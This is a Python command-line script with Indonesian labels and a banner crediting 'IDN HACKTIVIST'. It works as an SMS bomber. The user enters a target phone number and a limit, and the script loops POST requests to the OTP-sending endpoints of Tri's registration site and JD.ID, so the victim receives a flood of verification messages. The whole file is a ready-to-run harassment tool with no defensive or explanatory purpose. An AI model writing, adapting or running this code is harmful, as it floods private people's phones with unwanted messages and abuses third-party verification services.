import requests,os
def judul():
    print('''

\033[91m     ██▓▓█████▄  ███▄    █     ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▄▄▄█████▓ ██▓ ██▒   █▓ ██▓  ██████ ▄▄▄█████▓\033[0m
\033[91m    ▓██▒▒██▀ ██▌ ██ ▀█   █    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓  ██▒ ▓▒▓██▒▓██░   █▒▓██▒▒██    ▒ ▓  ██▒ ▓▒\033[0m
\033[91m    ▒██▒░██   █▌▓██  ▀█ ██▒   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒ ▓██░ ▒░▒██▒ ▓██  █▒░▒██▒░ ▓██▄   ▒ ▓██░ ▒░\033[0m
\033[91m    ░██░░▓█▄   ▌▓██▒  ▐▌██▒   ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░ ▓██▓ ░ ░██░  ▒██ █░░░██░  ▒   ██▒░ ▓██▓ ░ \033[0m
\033[91m    ░██░░▒████▓ ▒██░   ▓██░   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄  ▒██▒ ░ ░██░   ▒▀█░  ░██░▒██████▒▒  ▒██▒ ░ \033[0m
\033[91m    ░▓   ▒▒▓  ▒ ░ ▒░   ▒ ▒     ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒  ▒ ░░   ░▓     ░ ▐░  ░▓  ▒ ▒▓▒ ▒ ░  ▒ ░░   \033[0m
\033[91m     ▒ ░ ░ ▒  ▒ ░ ░░   ░ ▒░    ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░    ░     ▒ ░   ░ ░░   ▒ ░░ ░▒  ░ ░    ░    \033[0m
\033[91m     ▒ ░ ░ ░  ░    ░   ░ ░     ░  ░░ ░  ░   ▒   ░        ░ ░░ ░   ░       ▒ ░     ░░   ▒ ░░  ░  ░    ░      \033[0m
\033[91m     ░     ░             ░     ░  ░  ░      ░  ░░ ░      ░  ░             ░        ░   ░        ░           \033[0m
\033[91m         ░                                      ░                                 ░                         \033[0m

 {2}    --={3}[ {0}{5}Author: X-Code 404 , ZahidCode , BitterCode {3}]{2}=--
{4}| {2}-- --={3}[ {0}{5}Version:1                                   {3}]{2}=-- -- {4}|
| {2}-- --={3}[ {0}{5}Website: https://github.com/zahidin         {3}]{2}=-- -- {4}|
| {2}-- --={3}[ {0}{5}BOM SMS  ~ IDN HACKTIVIST                   {3}]{2}=-- -- {4}|
{0}
    '''.format(end_color, red, green, blue, yellow, bold))

bold = '\033[1m'
underline = '\033[4m'
black = '\033[90m'; red = '\033[91m'; green = '\033[92m'; yellow = '\033[93m'; blue = '\033[94m'; magenta = '\033[95m'; cyan = '\033[96m'; white = '\033[97m'
end_color = '\033[0m'

def tampil_pilihan():
    print('{0}[ Bom Sms Menu ]{1} '.format(green,end_color))
    print(' 1) BOM SMS TRI')
    print(' 2) BOM SMS JD.ID\n')

ulang = ''
while ulang != 'n':
    def pilihan(arg):
        try:
            func = tombol.get(arg)
            return func()
        except Exception as e :
            print(e)
            exit()

    def bom_tri():
        judul()
        nomor = input('Target :')
        limit = input('Limit  :')
        url = 'https://registrasi.tri.co.id/daftar/generateOTP'
        payload = {"msisdn":nomor}

        for i in range(int(limit)):
            res = requests.post(url,data=payload)
            if "success" in res.text:
                print("{0}Status =>{1}{2}".format(green,res.text,end_color))
            else:
                print("{0}Status =>{1}{2}".format(red,res.text,end_color))


    def bom_jd():
        judul()
        nomor = input('Target :')
        limit = input('Limit  :')
        url = 'http://sc.jd.id/phone/sendPhoneSms'
        payload = {"phone":nomor,'smsType':'1'}

        for i in range(int(limit)):
            res = requests.post(url,data=payload)
            if "true" in res.text:
                print("{0}Status =>{1}{2}".format(green,res.text,end_color))
            else:
                print("{0}Status =>{1}{2}".format(red,res.text,end_color))

    tombol = {1:bom_tri,2:bom_jd}

    judul()
    tampil_pilihan()
    pilih = int(input('{0}ZahidCode> {1}'.format(green,blue)))
    os.system('clear')
    pilihan(pilih)
    print("{0}./Done{1}".format(cyan,yellow))
    ulang = input("Ulang Lagi ?(y/n) :")
    os.system('clear')
